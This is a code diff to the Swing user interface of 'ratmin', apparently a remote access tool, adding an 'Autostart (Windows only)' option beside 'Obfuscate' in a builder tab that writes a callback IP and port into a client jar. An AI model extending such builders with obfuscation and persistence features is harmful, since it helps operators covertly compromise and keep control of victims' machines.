@@ -1,16 +1,20 @@
 package me.slimig.ratmin.user_interface.Ui;
 
-import java.awt.BorderLayout;
-import java.awt.Color;
-import java.awt.Dimension;
-import java.awt.Font;
-import java.awt.Toolkit;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
-import java.awt.event.KeyAdapter;
-import java.awt.event.KeyEvent;
-import java.awt.event.MouseAdapter;
-import java.awt.event.MouseEvent;
+import com.maxmind.geoip2.exception.GeoIp2Exception;
+import me.slimig.ratmin.server.Server;
+import me.slimig.ratmin.server.Streams;
+import me.slimig.ratmin.user_interface.Config.ConfigManager;
+import me.slimig.ratmin.user_interface.Ratmin;
+import me.slimig.ratmin.utils.ClassEditor;
+import me.slimig.ratmin.utils.Packets.Packet;
+
+import javax.swing.*;
+import javax.swing.GroupLayout.Alignment;
+import javax.swing.JSpinner.DefaultEditor;
+import javax.swing.LayoutStyle.ComponentPlacement;
+import javax.swing.border.CompoundBorder;
+import java.awt.*;
+import java.awt.event.*;
 import java.io.IOException;
 import java.net.BindException;
 import java.net.Socket;
@@ -18,36 +22,6 @@ import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.Iterator;
 
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
-import javax.swing.JButton;
-import javax.swing.JCheckBox;
-import javax.swing.JFrame;
-import javax.swing.JLabel;
-import javax.swing.JMenu;
-import javax.swing.JMenuItem;
-import javax.swing.JOptionPane;
-import javax.swing.JPanel;
-import javax.swing.JPopupMenu;
-import javax.swing.JScrollPane;
-import javax.swing.JSpinner;
-import javax.swing.JSpinner.DefaultEditor;
-import javax.swing.JTabbedPane;
-import javax.swing.JTable;
-import javax.swing.JTextField;
-import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.SpinnerModel;
-import javax.swing.SpinnerNumberModel;
-import javax.swing.border.CompoundBorder;
-
-import com.maxmind.geoip2.exception.GeoIp2Exception;
-
-import me.slimig.ratmin.server.Server;
-import me.slimig.ratmin.server.Streams;
-import me.slimig.ratmin.user_interface.Ratmin;
-import me.slimig.ratmin.user_interface.Config.ConfigManager;
-import me.slimig.ratmin.utils.ClassEditor;
-import me.slimig.ratmin.utils.Packets.Packet;
 
 public class Ui extends JFrame {
 
@@ -486,7 +460,11 @@ public class Ui extends JFrame {
         lblPort.setFont(new Font("Arial", Font.BOLD, 15));
         lblPort.setBounds(105, 125, 134, 32);
 
-        final JCheckBox chckbxObfuscate = new JCheckBox("Obfuscate");
+
+        JCheckBox chckbxAutostartwindowsOnly = new JCheckBox("Autostart (Windows only)");
+        chckbxAutostartwindowsOnly.setFont(new Font("Arial", Font.PLAIN, 14));
+
+        JCheckBox chckbxObfuscate = new JCheckBox("Obfuscate");
 
         chckbxObfuscate.setFont(new Font("Arial", Font.PLAIN, 14));
 
@@ -499,11 +477,21 @@ public class Ui extends JFrame {
                             && portname.getText().equalsIgnoreCase(""))) {
                         if (fname.getText().contains(".jar")) {
                             if (chckbxObfuscate.isSelected()) {
-                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
-                                        true);
+                                if (chckbxAutostartwindowsOnly.isSelected()) {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
+                                            true, true);
+                                } else {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
+                                            true, false);
+                                }
                             } else {
-                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
-                                        false);
+                                if (chckbxAutostartwindowsOnly.isSelected()) {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
+                                            false, true);
+                                } else {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
+                                            false, false);
+                                }
                             }
                             fname.setText("");
                             ipname.setText("");
@@ -511,11 +499,21 @@ public class Ui extends JFrame {
 
                         } else {
                             if (chckbxObfuscate.isSelected()) {
-                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
-                                        true);
+                                if (chckbxAutostartwindowsOnly.isSelected()) {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText() +".jar",
+                                            true, true);
+                                } else {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText() +".jar",
+                                            true, false);
+                                }
                             } else {
-                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(),
-                                        fname.getText() + ".jar", false);
+                                if (chckbxAutostartwindowsOnly.isSelected()) {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText() +".jar",
+                                            false, true);
+                                } else {
+                                    ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText() +".jar",
+                                            false, false);
+                                }
                             }
                             fname.setText("");
                             ipname.setText("");
@@ -542,45 +540,54 @@ public class Ui extends JFrame {
         });
         btnNewButton.setFont(new Font("Tahoma", Font.BOLD, 15));
 
+
         GroupLayout gl_builderpanel = new GroupLayout(builderpanel);
-        gl_builderpanel.setHorizontalGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING).addGroup(
-                gl_builderpanel.createSequentialGroup().addContainerGap(225, Short.MAX_VALUE).addGroup(gl_builderpanel
-                        .createParallelGroup(Alignment.LEADING)
-                        .addGroup(Alignment.TRAILING, gl_builderpanel.createSequentialGroup().addGroup(gl_builderpanel
-                                .createParallelGroup(Alignment.LEADING)
-                                .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 26, GroupLayout.PREFERRED_SIZE)
-                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
-                                        .addComponent(portname, Alignment.LEADING)
-                                        .addComponent(ipname, Alignment.LEADING)
-                                        .addGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING)
-                                                .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 134,
-                                                        GroupLayout.PREFERRED_SIZE)
-                                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
-                                                        .addComponent(fname, Alignment.LEADING, 201, 201,
-                                                                Short.MAX_VALUE)
-                                                        .addComponent(lblPort, Alignment.LEADING,
-                                                                GroupLayout.PREFERRED_SIZE, 134,
-                                                                GroupLayout.PREFERRED_SIZE)))
-                                        .addComponent(chckbxObfuscate, Alignment.LEADING)))
-                                .addGap(229))
-                        .addGroup(Alignment.TRAILING, gl_builderpanel.createSequentialGroup()
-                                .addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 105, GroupLayout.PREFERRED_SIZE)
-                                .addGap(273)))));
-        gl_builderpanel.setVerticalGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING).addGroup(gl_builderpanel
-                .createSequentialGroup().addGap(19)
-                .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(ComponentPlacement.RELATED)
-                .addComponent(fname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(ComponentPlacement.UNRELATED)
-                .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE).addGap(15)
-                .addComponent(ipname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-                .addGap(26).addComponent(lblPort, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(ComponentPlacement.RELATED)
-                .addComponent(portname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE,
-                        GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(ComponentPlacement.RELATED, 31, Short.MAX_VALUE).addComponent(chckbxObfuscate)
-                .addGap(18).addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 38, GroupLayout.PREFERRED_SIZE)
-                .addGap(22)));
+        gl_builderpanel.setHorizontalGroup(
+                gl_builderpanel.createParallelGroup(Alignment.LEADING)
+                        .addGroup(gl_builderpanel.createSequentialGroup()
+                                .addContainerGap(225, Short.MAX_VALUE)
+                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING)
+                                        .addGroup(gl_builderpanel.createSequentialGroup()
+                                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING)
+                                                        .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 26, GroupLayout.PREFERRED_SIZE)
+                                                        .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
+                                                                .addComponent(portname, Alignment.LEADING)
+                                                                .addComponent(ipname, Alignment.LEADING)
+                                                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING)
+                                                                        .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 134, GroupLayout.PREFERRED_SIZE)
+                                                                        .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
+                                                                                .addComponent(fname, Alignment.LEADING, 201, 201, Short.MAX_VALUE)
+                                                                                .addComponent(lblPort, Alignment.LEADING, GroupLayout.PREFERRED_SIZE, 134, GroupLayout.PREFERRED_SIZE)))
+                                                                .addComponent(chckbxAutostartwindowsOnly, Alignment.LEADING, GroupLayout.PREFERRED_SIZE, 193, GroupLayout.PREFERRED_SIZE)
+                                                                .addComponent(chckbxObfuscate, Alignment.LEADING)))
+                                                .addGap(229))
+                                        .addGroup(gl_builderpanel.createSequentialGroup()
+                                                .addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 105, GroupLayout.PREFERRED_SIZE)
+                                                .addGap(273))))
+        );
+        gl_builderpanel.setVerticalGroup(
+                gl_builderpanel.createParallelGroup(Alignment.LEADING)
+                        .addGroup(gl_builderpanel.createSequentialGroup()
+                                .addGap(19)
+                                .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
+                                .addPreferredGap(ComponentPlacement.RELATED)
+                                .addComponent(fname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+                                .addPreferredGap(ComponentPlacement.UNRELATED)
+                                .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
+                                .addGap(15)
+                                .addComponent(ipname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+                                .addGap(26)
+                                .addComponent(lblPort, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
+                                .addPreferredGap(ComponentPlacement.RELATED)
+                                .addComponent(portname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+                                .addPreferredGap(ComponentPlacement.UNRELATED)
+                                .addComponent(chckbxAutostartwindowsOnly)
+                                .addPreferredGap(ComponentPlacement.RELATED, 12, Short.MAX_VALUE)
+                                .addComponent(chckbxObfuscate)
+                                .addPreferredGap(ComponentPlacement.RELATED)
+                                .addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 38, GroupLayout.PREFERRED_SIZE)
+                                .addGap(22))
+        );
         builderpanel.setLayout(gl_builderpanel);
 
         // Builder Tab End
